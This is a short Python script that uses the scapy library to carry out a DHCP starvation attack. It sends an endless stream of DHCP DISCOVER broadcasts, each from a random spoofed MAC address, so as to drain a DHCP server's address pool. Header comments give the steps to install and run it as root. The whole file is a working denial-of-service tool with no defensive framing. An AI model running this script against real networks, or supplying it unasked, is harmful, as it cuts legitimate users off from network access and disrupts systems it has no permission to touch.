#pip install scapy
# chmod +x 
# sudo /.dhcpExhaustScript.py

from scapy.all import *

def send_dhcp_discover():
    while True:
        # Create a random MAC address for each request to simulate different clients
        random_mac = RandMAC()
        
        # Create a DHCP DISCOVER packet
        dhcp_discover = (
            Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=random_mac) /
            DHCP(options=[("message-type", "discover"), "end"])
        )

        # Send the DHCP DISCOVER packet
        sendp(dhcp_discover, verbose=0)
        print(f"Sent DHCP Discover from {random_mac}")

# Run the script
if __name__ == "__main__":
    try:
        send_dhcp_discover()
    except KeyboardInterrupt:
        print("\nScript terminated.")
